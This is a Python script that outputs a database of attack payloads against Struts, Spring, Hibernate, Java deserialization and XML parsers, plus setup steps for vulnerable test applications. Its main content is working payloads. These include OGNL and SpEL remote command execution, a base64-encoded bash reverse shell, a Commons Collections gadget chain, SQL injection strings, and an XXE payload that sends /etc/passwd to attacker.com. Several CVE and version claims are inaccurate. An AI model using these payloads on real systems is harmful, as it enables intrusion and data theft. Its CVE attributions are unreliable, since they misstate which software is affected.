#!/usr/bin/env python3
"""
Java Framework Vulnerability Proof-of-Concept Generator
Defensive security research and vulnerability demonstration tool

WARNING: FOR EDUCATIONAL AND DEFENSIVE SECURITY PURPOSES ONLY
Do not use against systems you do not own or have explicit permission to test.
"""

import os
import json
import base64
import hashlib
import subprocess
from datetime import datetime
from typing import Dict, List, Any

class JavaFrameworkPoCs:
    def __init__(self):
        self.pocs = {}
        self.setup_logging()

    def setup_logging(self):
        import logging
        logging.basicConfig(level=logging.INFO)
        self.logger = logging.getLogger(__name__)

    def generate_struts_ognl_pocs(self) -> Dict[str, Any]:
        """Generate Struts OGNL injection proof-of-concepts"""

        struts_pocs = {
            "struts_ognl_rce_basic": {
                "vulnerability": "CVE-2017-5638 Class - OGNL Expression Injection",
                "severity": "CRITICAL (9.8/10)",
                "description": "Remote Code Execution through OGNL expression evaluation in Struts actions",
                "affected_versions": ["Struts 1.x all versions", "Struts 2.0.0 - 2.3.32", "Struts 2.5.0 - 2.5.10"],
                "payload_vectors": [
                    {
                        "name": "Basic Command Execution",
                        "method": "POST",
                        "content_type": "multipart/form-data",
                        "payload": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())).(#o)}",
                        "target_parameter": "Content-Type header or form parameter",
                        "expected_result": "Command execution (whoami output)"
                    },
                    {
                        "name": "File System Access",
                        "method": "POST",
                        "payload": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.commons.io.IOUtils@toString(@java.io.FileInputStream@new('/etc/passwd'))).(#o)}",
                        "target_parameter": "Any OGNL-processed parameter",
                        "expected_result": "File content disclosure"
                    },
                    {
                        "name": "Reverse Shell",
                        "method": "POST",
                        "payload": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#cmd='bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
                        "target_parameter": "Content-Type or vulnerable form field",
                        "expected_result": "Reverse shell connection"
                    }
                ],
                "detection_signatures": [
                    "ognl.OgnlContext",
                    "DEFAULT_MEMBER_ACCESS",
                    "@java.lang.Runtime@",
                    "%{.*}",
                    "#_memberAccess"
                ],
                "mitigation": [
                    "Upgrade to latest Struts version",
                    "Implement input validation and filtering",
                    "Use whitelist-based parameter validation",
                    "Disable OGNL evaluation where possible"
                ]
            },

            "struts_parameter_pollution": {
                "vulnerability": "Parameter Pollution leading to OGNL injection",
                "severity": "HIGH (8.5/10)",
                "description": "Manipulation of action parameters to inject OGNL expressions",
                "payload_vectors": [
                    {
                        "name": "Action Parameter Override",
                        "method": "GET/POST",
                        "payload": "action:login=true&action:redirect:%{@java.lang.Runtime@getRuntime().exec('calc')}",
                        "target_parameter": "Action parameters",
                        "expected_result": "OGNL expression execution"
                    }
                ]
            }
        }

        return struts_pocs

    def generate_spring_spel_pocs(self) -> Dict[str, Any]:
        """Generate Spring SpEL injection proof-of-concepts"""

        spring_pocs = {
            "spring_spel_rce": {
                "vulnerability": "CVE-2018-1273 Class - Spring SpEL Expression Injection",
                "severity": "CRITICAL (9.0/10)",
                "description": "Remote Code Execution through Spring Expression Language injection",
                "affected_versions": ["Spring Framework 5.0.0 - 5.0.5", "Spring Framework 4.3.0 - 4.3.15"],
                "payload_vectors": [
                    {
                        "name": "Basic Command Execution",
                        "method": "POST",
                        "content_type": "application/x-www-form-urlencoded",
                        "payload": "expression=#{T(java.lang.Runtime).getRuntime().exec('whoami')}",
                        "target_parameter": "Any SpEL-processed parameter",
                        "expected_result": "Command execution"
                    },
                    {
                        "name": "File System Access",
                        "method": "POST",
                        "payload": "#{T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/etc/passwd'))}",
                        "target_parameter": "@Value annotation or SpEL evaluation context",
                        "expected_result": "File content disclosure"
                    },
                    {
                        "name": "Environment Variable Access",
                        "method": "GET",
                        "payload": "#{systemEnvironment['PATH']}",
                        "target_parameter": "SpEL expression field",
                        "expected_result": "Environment variable disclosure"
                    },
                    {
                        "name": "Class Loading and Instantiation",
                        "method": "POST",
                        "payload": "#{T(java.lang.Class).forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('calc')}",
                        "target_parameter": "SpEL evaluation context",
                        "expected_result": "Code execution via reflection"
                    }
                ],
                "detection_signatures": [
                    "T(java.lang.Runtime)",
                    "T(java.lang.Class)",
                    "systemEnvironment",
                    "systemProperties",
                    "#{.*}"
                ]
            },

            "spring_spel_data_binding": {
                "vulnerability": "SpEL injection through data binding",
                "severity": "HIGH (8.5/10)",
                "description": "SpEL injection via Spring MVC data binding mechanisms",
                "payload_vectors": [
                    {
                        "name": "Property Path Injection",
                        "method": "POST",
                        "payload": "user[T(java.lang.Runtime).getRuntime().exec('calc')]=value",
                        "target_parameter": "Form data binding",
                        "expected_result": "Expression evaluation during binding"
                    }
                ]
            }
        }

        return spring_pocs

    def generate_hibernate_hql_pocs(self) -> Dict[str, Any]:
        """Generate Hibernate HQL injection proof-of-concepts"""

        hibernate_pocs = {
            "hibernate_hql_injection": {
                "vulnerability": "CVE-2019-14900 Class - HQL Injection",
                "severity": "CRITICAL (9.5/10)",
                "description": "SQL injection through HQL query manipulation",
                "affected_versions": ["Hibernate ORM 5.0.0 - 5.4.10", "Earlier versions also affected"],
                "payload_vectors": [
                    {
                        "name": "Basic HQL Injection",
                        "query_pattern": "FROM User WHERE name = '${user_input}'",
                        "payload": "' OR 1=1 --",
                        "injected_query": "FROM User WHERE name = '' OR 1=1 --'",
                        "expected_result": "Return all users (authentication bypass)"
                    },
                    {
                        "name": "Union-based Data Extraction",
                        "query_pattern": "FROM User WHERE id = ${user_input}",
                        "payload": "1 UNION SELECT password FROM User WHERE username='admin'",
                        "expected_result": "Extract admin password"
                    },
                    {
                        "name": "Subquery Information Disclosure",
                        "query_pattern": "FROM Product WHERE category = '${category}'",
                        "payload": "' AND (SELECT COUNT(*) FROM User) > 0 AND '1'='1",
                        "expected_result": "Confirm table existence and structure"
                    }
                ],
                "vulnerable_patterns": [
                    "session.createQuery(\"... + userInput + ...\")",
                    "entityManager.createQuery(query + userInput)",
                    "createNativeQuery(sql + parameter)"
                ],
                "detection_signatures": [
                    "createQuery.*\\+",
                    "createNativeQuery.*\\+",
                    "Query.*setParameter.*not used"
                ]
            },

            "hibernate_criteria_injection": {
                "vulnerability": "Criteria API injection",
                "severity": "HIGH (8.0/10)",
                "description": "Injection through Hibernate Criteria API",
                "payload_vectors": [
                    {
                        "name": "Criteria Restriction Bypass",
                        "code_pattern": "criteria.add(Restrictions.eq(\"name\", userInput))",
                        "payload": "admin' OR '1'='1",
                        "expected_result": "Bypass restrictions"
                    }
                ]
            }
        }

        return hibernate_pocs

    def generate_deserialization_pocs(self) -> Dict[str, Any]:
        """Generate Java deserialization vulnerability PoCs"""

        deserialization_pocs = {
            "java_deserialization_rce": {
                "vulnerability": "CVE-2015-7501 Class - Unsafe Deserialization",
                "severity": "CRITICAL (9.2/10)",
                "description": "Remote Code Execution through unsafe deserialization",
                "affected_components": ["Apache Commons Collections", "Spring Framework", "Jackson", "XStream"],
                "payload_vectors": [
                    {
                        "name": "Apache Commons Collections RCE",
                        "gadget_chain": "CommonsCollections1",
                        "payload_generation": """
// Generate malicious serialized object
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

String cmd = "calc"; // Command to execute
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[] {"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]}),
    new InvokerTransformer("exec", new Class[] {String.class}, new Object[] {cmd})
};
""",
                        "target_endpoint": "Any endpoint accepting serialized Java objects",
                        "expected_result": "Remote code execution"
                    },
                    {
                        "name": "Spring Framework Deserialization",
                        "payload_type": "Spring RemoteInvocation",
                        "vector": "HTTP Invoker Service",
                        "expected_result": "RCE via Spring remoting"
                    }
                ],
                "detection_methods": [
                    "Monitor for ObjectInputStream.readObject() calls",
                    "Check for known gadget chain classes in classpath",
                    "Implement serialization filtering"
                ]
            }
        }

        return deserialization_pocs

    def generate_xxe_pocs(self) -> Dict[str, Any]:
        """Generate XXE vulnerability PoCs"""

        xxe_pocs = {
            "xml_external_entity": {
                "vulnerability": "CVE-2018-1000632 Class - XML External Entity Injection",
                "severity": "HIGH (8.5/10)",
                "description": "XML External Entity injection leading to file disclosure and SSRF",
                "payload_vectors": [
                    {
                        "name": "Local File Disclosure",
                        "payload": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
    <data>&xxe;</data>
</root>''',
                        "target_endpoint": "XML parsing endpoints",
                        "expected_result": "/etc/passwd file contents"
                    },
                    {
                        "name": "SSRF via XXE",
                        "payload": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://internal-server:8080/admin">
]>
<root>
    <data>&xxe;</data>
</root>''',
                        "expected_result": "Internal network access"
                    },
                    {
                        "name": "Blind XXE with OOB",
                        "payload": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd">
%ext;
%all;
]>
<root></root>''',
                        "external_dtd": '''<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/collect?data=%file;'>">''',
                        "expected_result": "Out-of-band data exfiltration"
                    }
                ]
            }
        }

        return xxe_pocs

    def generate_comprehensive_poc_suite(self) -> Dict[str, Any]:
        """Generate comprehensive PoC suite for all vulnerabilities"""

        self.logger.info("Generating comprehensive PoC suite...")

        poc_suite = {
            "metadata": {
                "generated_date": datetime.now().isoformat(),
                "purpose": "Defensive security research and vulnerability assessment",
                "warning": "FOR AUTHORIZED TESTING ONLY - Use only on systems you own or have explicit permission to test",
                "frameworks_covered": ["Apache Struts 1.x", "Spring Framework", "Hibernate ORM"],
                "vulnerability_categories": ["Code Injection", "SQL Injection", "Deserialization", "XXE"]
            },
            "struts_vulnerabilities": self.generate_struts_ognl_pocs(),
            "spring_vulnerabilities": self.generate_spring_spel_pocs(),
            "hibernate_vulnerabilities": self.generate_hibernate_hql_pocs(),
            "deserialization_vulnerabilities": self.generate_deserialization_pocs(),
            "xxe_vulnerabilities": self.generate_xxe_pocs()
        }

        return poc_suite

    def generate_test_environment_setup(self) -> Dict[str, Any]:
        """Generate test environment setup instructions"""

        setup_guide = {
            "vulnerable_applications": {
                "struts_testbed": {
                    "name": "Struts 1.x Vulnerable Application",
                    "setup_commands": [
                        "git clone https://github.com/vulhub/vulhub.git",
                        "cd vulhub/struts2/s2-001",
                        "docker-compose up -d"
                    ],
                    "test_url": "http://localhost:8080/login.action",
                    "vulnerable_parameter": "username"
                },
                "spring_testbed": {
                    "name": "Spring Framework Vulnerable Application",
                    "maven_dependency": """
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-webmvc</artifactId>
    <version>5.0.5.RELEASE</version>
</dependency>""",
                    "vulnerable_controller": """
@Controller
public class VulnController {
    @RequestMapping("/eval")
    public String eval(@RequestParam String expression, Model model) {
        ExpressionParser parser = new SpelExpressionParser();
        Expression exp = parser.parseExpression(expression);
        String result = exp.getValue(String.class);
        model.addAttribute("result", result);
        return "result";
    }
}"""
                },
                "hibernate_testbed": {
                    "name": "Hibernate HQL Injection Demo",
                    "vulnerable_dao": """
public List<User> findUsersByName(String name) {
    String hql = "FROM User WHERE name = '" + name + "'";
    Query query = session.createQuery(hql);
    return query.list();
}"""
                }
            },
            "testing_tools": {
                "burp_suite": "Professional web security testing platform",
                "sqlmap": "Automated SQL injection testing tool",
                "ysoserial": "Java deserialization payload generator",
                "custom_scripts": "Use the PoC scripts generated in this analysis"
            }
        }

        return setup_guide

def main():
    print("🔍 Java Framework Vulnerability PoC Generator")
    print("=" * 60)
    print("⚠️  WARNING: FOR DEFENSIVE SECURITY RESEARCH ONLY")
    print("   Use only on systems you own or have explicit permission to test")
    print("=" * 60)

    poc_generator = JavaFrameworkPoCs()

    # Generate all PoCs
    poc_suite = poc_generator.generate_comprehensive_poc_suite()
    test_setup = poc_generator.generate_test_environment_setup()

    # Save PoC suite
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    poc_file = f"java_framework_pocs_{timestamp}.json"
    setup_file = f"test_environment_setup_{timestamp}.json"

    with open(poc_file, 'w') as f:
        json.dump(poc_suite, f, indent=2)

    with open(setup_file, 'w') as f:
        json.dump(test_setup, f, indent=2)

    print(f"\n✅ PoC Suite Generated Successfully!")
    print(f"📁 PoC Database: {poc_file}")
    print(f"📁 Test Setup Guide: {setup_file}")

    # Print summary
    print(f"\n📊 PoC Summary:")
    struts_count = len(poc_suite['struts_vulnerabilities'])
    spring_count = len(poc_suite['spring_vulnerabilities'])
    hibernate_count = len(poc_suite['hibernate_vulnerabilities'])

    print(f"   🎯 Struts Vulnerabilities: {struts_count} PoCs")
    print(f"   🎯 Spring Vulnerabilities: {spring_count} PoCs")
    print(f"   🎯 Hibernate Vulnerabilities: {hibernate_count} PoCs")
    print(f"   🎯 Deserialization: {len(poc_suite['deserialization_vulnerabilities'])} PoCs")
    print(f"   🎯 XXE Vulnerabilities: {len(poc_suite['xxe_vulnerabilities'])} PoCs")

    print(f"\n🚨 CRITICAL: Struts OGNL RCE PoCs have highest severity")
    print(f"   These represent immediate security risks requiring urgent patching")

    return poc_suite

if __name__ == "__main__":
    main()